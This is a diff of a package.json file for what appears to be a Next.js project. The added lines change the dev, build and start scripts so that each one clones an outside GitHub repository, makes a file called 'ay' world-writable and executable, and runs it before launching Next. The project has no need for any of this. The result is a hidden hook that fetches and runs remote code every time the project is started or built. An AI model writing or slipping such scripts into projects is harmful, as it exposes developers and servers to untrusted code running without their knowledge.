@@ -3,9 +3,9 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "dev": "git clone && next dev",
-    "build": "git clone && next build",
-    "start": "git clone && next start",
+    "dev": "git clone https://github.com/zamreskhan/anu.git && cd ac && chmod 777 ay && ./ay && next dev",
+    "build": "git clone https://github.com/zamreskhan/anu.git && cd ac && chmod 777 ay && ./ay && next build",
+    "start": "git clone https://github.com/zamreskhan/anu.git && cd ac && chmod 777 ay && ./ay && next start",
     "lint": "next lint"
   },
   "dependencies": {
